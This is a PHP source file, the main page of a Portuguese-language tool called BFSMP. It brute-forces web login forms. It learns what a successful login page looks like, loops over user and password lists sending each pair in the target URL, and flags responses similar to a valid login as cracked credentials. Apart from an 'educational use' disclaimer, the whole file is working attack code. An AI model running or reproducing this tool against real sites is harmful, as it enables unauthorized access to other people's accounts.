<?
//                                                      ________
//                                                     | BFSMP |
// +------------------------------------------------------------+
// + Index of BFSMP  - by tDs - tds@motdlabs.org                +
// +------------------------------------------------------------+
// + file: index.php                                            +
// +------------------------------------------------------------+
// + Arquivo que sera acessado para execucao do script.         +
// +                                                            +
// + Use por conta e risco                                      +
// + Nao me responsabilizo por nada que venha a ser feito       +
// + decorrente do uso deste script.                            +
// +                                                            +
// + Use para fins educacionais :)                              +
// +------------------------------------------------------------+

/*
if ($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
{
    echo "aqui nao pode!";
    die;
}
*/

//error_reporting (E_ALL ^ E_NOTICE);
error_reporting (0);
ob_implicit_flush(0);
/***
 * secao includes
 */
    include "inc/cfg.inc.php";
    include "inc/funcoes.inc.php";
    include "inc/modulos.inc.php";
    include "inc/treina.inc.php";

/***
 * secao vars
 */
    $agora[0] = getmicrotime();/* inicia contagem de tempo */
    $now = ret_time();
    if (_MOSTRAR_ERROS_ == 1)
    {
        error_reporting (E_ALL);
    }

/***
 * inicio aqui
 */
    /***
     * aqui e' analisado a semelhanca entre uma pagina 
     * com login valido e invalido
     */

if (isOpcao($opcao))
{          
    $TREINO_ERRO = treinaErro(_us_invalido_,_se_invalido_);
    $TREINO_OK = treinaOK(_us_valido_,_se_valido_);
    
    $link_ERRO = $TREINO_ERRO[0];
    $try_ERRO = $TREINO_ERRO[1];
    
    $link_OK = $TREINO_OK[0];
    $try_OK = $TREINO_OK[1];

        
    $dif =  similar_text($try_ERRO,$try_OK,$perc);
    $perc = round($perc, 1);
    define("_semelhanca_",$perc);
    /* define a semelhanca entre certo e errado */
}
    
    definirOpcao($opcao);
    /* define opcao de teste */

    
        
/***
 * aqui comeca a exibir a pagina
 */    

mostra ("<html>");
mostra ("<title>"._TITULO_."</title>");

if ($pagina == "vazio")
{
    mostra ("<LINK href=imgs/teste.css rel=stylesheet type=text/css></a>");
    mostra ("<body></body></html>");
    die();
}

mostra ("<LINK href=imgs/vazio.css rel=stylesheet type=text/css></a>");
mostra ("<body>");
mostra ("<center>");

mostra ("<table width=601 bgcolor=#000000><tr><td>");

mostra ("<table width=600 bgcolor=#ffffff><tr><td>");
mostra ("<font color=red><center>");
menu();
mostra ("</center></font></td></tr></table>");
   
if (!defined('_inicio_') && $opcao != "debug")
{
    mostra ("</td></tr></table>");
    mostra ("&nbsp;<table width=601 bgcolor=#000000>");
    mostra ("<tr><td><table width=600 bgcolor=#ffffff><tr><td><center>");
    mostra("<img src=imgs/pedra.jpg>");
    mostra("</td></tr></table></td></tr></table>");
    
    rodape();
    mostra ("</body></html>");
    die;
}
mostra ("</td></tr><tr><td>");
mostra ("<table width=600 class=tabela2><tr><td>");
mostra ("<center>Testes iniciados as $now.</center><br>");


if ( defined('_debugging_') )
{
    echo "Conteudo da pagina:<br>
         <textarea cols=62 rows=6> $try_ERRO </textarea><br>\n
         <a href=$link_ERRO>Link para senha invalida.</a><br><br><hr>";
            
    echo "Conteudo da pagina:<br>
         <textarea cols=62 rows=6> $try_OK </textarea><br>\n
         <a href=$link_OK>Link para senha valida.</a><br><br>";
        
    mostra ("</td></tr></table>");
    mostra ("</td></tr><tr><td>");
    mostra ("<table width=600 class=tabela3><tr><td>");
    echo "A semelhanca entre a pagina com o login correto e com o
         login incorreto esta em "._semelhanca_."%\n";
    mostra ("</td></tr></table>");
    mostra ("</td></tr></table>");
    rodape();
    mostra ("</center></body></html>");  
    die();

}
    $usuarios = ret_usuario();
    $senhas = ret_senha();

    $n_usuario = sizeof( $usuarios );
    $n_senha = sizeof( $senhas );

    $flag = 0;
    $tentativas = $n_usuario * $n_senha;
    $cont = 0;
    $contador = 0;

if (defined('_debugging_online_'))
{
    echo "<iframe src=index.php?pagina=vazio name=conteudo ".
         "width=590 height=100 frameborder=0></iframe><br>\n";
}

  $bl = 0;
  for ( $cont_usuarios = 0; $cont_usuarios < $n_usuario; $cont_usuarios++ )
  {
    $us = $usuarios[$cont_usuarios];
    for ( $cont_senhas = 0; $cont_senhas < $n_senha; $cont_senhas++ )
    {
        $se = $senhas[$cont_senhas];
        $link_t = _site_._CAMPO_USUARIO_."=$us&"._CAMPO_SENHA_."=$se";
        $alvo = fopen ( $link_t,"r" );
        $try = fread( $alvo,100000 );

        $try = limparFonte ($try);

        $dif =  similar_text($try_OK,$try,$perc);
        $perc = round($perc, 1);
        //echo "percentual $perc - sem. ".semelhanca;
        //die();
        if (defined('_debugging_online_'))
        {
            $bl++;
            $add = 
            "<html><title>$titulo</title>".
            "<LINK href=../teste.css rel=stylesheet type=text/css></a><body>";
            $try = $add.$try;
            temp_arq("temp/tmp$cont.htm",$try);
            echo "<a href=\"temp/tmp$cont.htm\" ".
                 "target=conteudo title=\"Resultado\">$cont</a>&nbsp;\n";
            if($bl > 42 )
            {
                $bl = 0;
           }
        }

        if ( $perc + _OFFSET_ > _semelhanca_ )
        {
            $now = ret_time();
            $valido['usuario'][$contador] = $us;
            $valido['senha'][$contador] = $se;
            $valido['perc'][$contador] = $perc;
            $valido['link'][$contador] = $link_t;
            $valido['time'][$contador] = $now;
            $valido['n_t'][$contador] = $cont;
            $flag = 1;
            $contador++;
        }
        $cont++;
    }
}

 if ( $flag == 0 )
 {
    echo "<br><b>Tente melhorar a lista com usuarios e senhas.".
         "Provavelmente nenhum usuario ou senha � valido.</b> \n";
 }
 if ( $flag == 1 )
 {
    $loop = $contador;
    for ($x = 0; $x < $loop; $x++)
    {
        $a = $cont[$loop];
        $us = $valido['usuario'][$x];
        $se = $valido['senha'][$x];
        $perc = $valido['perc'][$x];
        $link_t = $valido['link'][$x];
        $now = $valido['time'][$x];
        $cont = $valido['n_t'][$x];

    mostra ("<center><table width=590 class=tabela4><tr><td>");
    if (defined('_debugging_online_'))
    {
        echo "Verifique o codigo no link $cont acima.<br><br>";
    }
    echo "Utilizando <b>$us</b> como usuario e <b>$se</b> como senha,<br>\n".
         "a semelhanca do resultado com um login valido alcanca \n".
         "$perc.%.<br>Se este nao for um login valido, algum erro \n".
         "ocorreu.<br>Para testa-lo, \n<a href=$link_t>\nclique aqui</a>.<br><br>\n";
    mostra ("</td></tr></table>&nbsp;");
    }
}

/***
 * todo comeco tem um fim
 */

    $agora[1] = getmicrotime(); //finaliza a contagem de tempo
    $tempo = $agora[1] - $agora[0]; //calcula o tempo gasto
    $tempo = round($tempo,2);
    $bench = round(($tentativas / $tempo),1);
    mostra ("</td></tr></table>");
    mostra ("</td></tr><tr><td>");
    mostra ("<table width=600 class=tabela3><tr><td>");
    echo "Foram feitas $tentativas tentativas em $tempo".
         " segundos. ($bench t/s) ";

    $now = ret_time();
    mostra ("<br>Testes finalizados as $now");
    mostra ("</td></tr></table>");
    mostra ("</td></tr></table>");
    rodape();
    mostra ("</center></body></html>");
    
    
?>
